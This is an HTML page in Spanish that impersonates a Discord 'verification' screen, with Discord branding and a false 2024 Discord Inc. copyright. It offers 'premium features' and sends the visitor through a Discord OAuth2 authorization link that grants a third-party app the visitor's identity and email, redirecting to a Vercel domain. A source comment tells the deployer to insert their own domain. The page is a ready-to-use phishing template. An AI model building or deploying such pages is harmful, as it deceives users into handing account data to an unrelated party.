<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Verificación</title>
    <style>
        body { background-color: #36393f; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
        .card { background-color: #2f3136; padding: 40px; border-radius: 8px; text-align: center; width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
        .logo { width: 80px; margin-bottom: 20px; }
        h2 { margin: 0 0 10px 0; font-size: 24px; }
        p { color: #b9bbbe; font-size: 14px; margin-bottom: 30px; line-height: 1.4; }
        .btn { display: block; width: 100%; padding: 12px 0; background-color: #7289da; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 16px; transition: background 0.2s; }
        .btn:hover { background-color: #5c6eae; }
        .footer { margin-top: 20px; font-size: 12px; color: #72767d; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Discord" class="logo">
        <h2>Aceptar Invitación</h2>
        <p>Haz clic abajo para verificar tu cuenta y acceder a todas las funciones premium.</p>
        
        <!-- Reemplaza TU_URL_VERCEL con tu dominio real -->
        <a href="https://discord.com/oauth2/authorize?client_id=1567793753396088863&redirect_uri=https%3A%2F%2Fverify-discord-sandy.vercel.app%2Fcallback&response_type=code&scope=identify%20email" class="btn">
            Continuar
        </a>
        <div class="footer">© 2024 Discord Inc.</div>
    </div>
</body>
</html>
